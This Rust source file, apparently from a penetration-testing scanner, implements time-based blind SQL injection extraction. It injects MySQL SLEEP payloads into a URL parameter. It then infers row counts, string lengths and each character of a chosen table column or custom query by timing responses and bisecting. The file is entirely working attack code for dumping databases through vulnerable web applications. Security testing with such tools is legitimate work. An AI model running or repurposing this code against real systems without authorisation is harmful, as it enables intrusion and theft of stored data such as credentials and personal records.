//! Time-based blind data extraction: bisection algorithm using SLEEP/WAITFOR
//! delays as the oracle instead of page-content differences.

use std::time::{Duration, Instant};
use tokio::time::timeout;
use anyhow::Result;
use tracing::info;

use crate::sqx::{
    detector::SqliDetector,
    models::{
        BlindExtractionConfig, BlindExtractionProgress, BlindExtractionResult,
        CancellationToken, ExtractionStatus,
    },
};

impl SqliDetector {
    /// Extract data using time-based blind SQL injection.
    pub async fn extract_data_time_based(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        extraction_config: &BlindExtractionConfig,
        progress_callback: Option<Box<dyn Fn(BlindExtractionProgress) + Send + Sync>>,
        cancel_token: Option<CancellationToken>,
    ) -> Result<BlindExtractionResult> {
        let start_time = Instant::now();
        let mut total_requests = 0;
        let mut extracted_values = Vec::new();

        info!(
            "Starting time-based blind extraction from {}.{}",
            extraction_config.target_table, extraction_config.target_column
        );

        if let Some(ref token) = cancel_token
            && token.is_cancelled() {
                return Ok(BlindExtractionResult {
                    extracted_values: vec![],
                    total_requests: 0,
                    extraction_time_secs: 0,
                    technique_used: "Cancelled".to_string(),
                });
            }

        // Statistical baseline: 3 samples → mean + 2σ threshold
        let (baseline_mean, baseline_stddev) = self.measure_baseline_timing(url, 3).await?;
        let threshold = baseline_mean + baseline_stddev * 2;
        total_requests += 3;
        info!(
            "Baseline timing: mean={:?}, stddev={:?}, threshold={:?}",
            baseline_mean, baseline_stddev, threshold
        );

        let row_count = self
            .get_row_count_time_based(
                url, param, original_value, extraction_config,
                &mut total_requests, cancel_token.as_ref(), threshold,
            )
            .await?;

        let rows_to_extract = row_count.min(extraction_config.max_rows);

        for row_index in 0..rows_to_extract {
            if let Some(ref token) = cancel_token
                && token.is_cancelled() {
                    break;
                }

            let value = self
                .extract_string_time_based(
                    url, param, original_value, extraction_config,
                    row_index, &mut total_requests,
                    progress_callback.as_ref(), cancel_token.as_ref(), threshold,
                )
                .await?;

            if !value.is_empty() {
                extracted_values.push(value.clone());
                if let Some(ref callback) = progress_callback {
                    callback(BlindExtractionProgress {
                        current_value_index: row_index + 1,
                        current_char_index: value.len(),
                        extracted_so_far: value,
                        total_requests,
                        status: ExtractionStatus::Running,
                    });
                }
            }
        }

        let elapsed = start_time.elapsed();
        let is_cancelled = cancel_token.as_ref().map(|t| t.is_cancelled()).unwrap_or(false);

        Ok(BlindExtractionResult {
            extracted_values,
            total_requests,
            extraction_time_secs: elapsed.as_secs(),
            technique_used: if is_cancelled {
                "TimeBased(Stopped)".to_string()
            } else {
                "TimeBased".to_string()
            },
        })
    }

    /// Get row count using time-based technique.
    pub(crate) async fn get_row_count_time_based(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        config: &BlindExtractionConfig,
        request_count: &mut usize,
        cancel_token: Option<&CancellationToken>,
        threshold: Duration,
    ) -> Result<usize> {
        if let Some(token) = cancel_token
            && token.is_cancelled() {
                return Ok(0);
            }

        let query = format!("(SELECT COUNT(*) FROM {})", config.target_table);
        let count = self
            .extract_number_time_based(
                url, param, original_value, &query,
                0, 9999, request_count, cancel_token, threshold,
            )
            .await?;

        Ok(count as usize)
    }

    /// Extract string using time-based technique.
    pub(crate) async fn extract_string_time_based(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        config: &BlindExtractionConfig,
        row_index: usize,
        request_count: &mut usize,
        progress_callback: Option<&Box<dyn Fn(BlindExtractionProgress) + Send + Sync>>,
        cancel_token: Option<&CancellationToken>,
        threshold: Duration,
    ) -> Result<String> {
        let mut result = String::new();

        let subquery = if let Some(ref custom) = config.custom_query {
            format!("({})", custom)
        } else {
            format!(
                "(SELECT {} FROM {}{} LIMIT 1 OFFSET {})",
                config.target_column,
                config.target_table,
                config
                    .where_clause
                    .as_ref()
                    .map(|w| format!(" WHERE {}", w))
                    .unwrap_or_default(),
                row_index
            )
        };

        if let Some(token) = cancel_token
            && token.is_cancelled() {
                return Ok(result);
            }

        let length_query = format!("LENGTH({})", subquery);
        let length = self
            .extract_number_time_based(
                url, param, original_value, &length_query,
                0, config.max_length_per_value as i32, request_count,
                cancel_token, threshold,
            )
            .await?;

        for pos in 1..=length {
            if let Some(token) = cancel_token
                && token.is_cancelled() {
                    return Ok(result);
                }

            let char_query = format!("ASCII(SUBSTRING({}, {}, 1))", subquery, pos);
            let ascii_val = self
                .extract_number_time_based(
                    url, param, original_value, &char_query,
                    0, 127, request_count, cancel_token, threshold,
                )
                .await?;

            if let Some(ch) = char::from_u32(ascii_val as u32) {
                result.push(ch);
                if let Some(callback) = progress_callback {
                    callback(BlindExtractionProgress {
                        current_value_index: row_index,
                        current_char_index: pos as usize,
                        extracted_so_far: result.clone(),
                        total_requests: *request_count,
                        status: ExtractionStatus::Running,
                    });
                }
            }
        }

        Ok(result)
    }

    /// Extract a number using time-based bisection.
    ///
    /// Standard single-request-per-level bisection: while low < high,
    /// test `query > mid`. If true → low = mid + 1, else → high = mid.
    /// When low == high the answer is found. O(log n) requests, no equality check.
    pub(crate) async fn extract_number_time_based(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        query: &str,
        min_val: i32,
        max_val: i32,
        request_count: &mut usize,
        cancel_token: Option<&CancellationToken>,
        threshold: Duration,
    ) -> Result<i32> {
        let mut low = min_val;
        let mut high = max_val;

        while low < high {
            if let Some(token) = cancel_token
                && token.is_cancelled() {
                    return Ok(low);
                }

            let mid = low + (high - low) / 2;

            let condition = format!("{} > {}", query, mid);
            let is_greater = self
                .test_condition_time_based(
                    url, param, original_value, &condition, threshold,
                )
                .await?;
            *request_count += 1;

            if is_greater {
                low = mid + 1;
            } else {
                high = mid; // value <= mid, so mid is still a candidate
            }

            tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
        }

        Ok(low) // low == high == answer
    }

    /// Test a condition using time-based technique.
    ///
    /// Returns `true` if a time delay occurred (condition is TRUE).
    /// `threshold` is the pre-computed upper bound of normal response time
    /// (`mean + 2 * stddev`). A response is considered delayed if it exceeds
    /// `threshold + sleep_duration/2` (headroom below the injected SLEEP).
    pub(crate) async fn test_condition_time_based(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        condition: &str,
        threshold: Duration,
    ) -> Result<bool> {
        let sleep_secs = self.config.sleep_duration_secs;
        let is_numeric = original_value.parse::<i64>().is_ok();

        let payload = if is_numeric {
            format!("{} AND IF({}, SLEEP({}), 0)", original_value, condition, sleep_secs)
        } else {
            format!("{}' AND IF({}, SLEEP({}), 0)-- ", original_value, condition, sleep_secs)
        };

        let test_url = self.build_test_url(url, param, original_value, &payload);

        let start = Instant::now();
        match timeout(Duration::from_secs(10 + sleep_secs), self.send_request(&test_url)).await {
            Ok(Ok(_)) => {
                let duration = start.elapsed();
                // Use half the sleep duration as headroom to account for network variance
                let detection_threshold = threshold + Duration::from_secs(sleep_secs / 2);
                Ok(duration > detection_threshold)
            }
            Ok(Err(_)) => Ok(false),
            Err(_) => Ok(true), // Timeout → SLEEP executed → condition TRUE
        }
    }
}
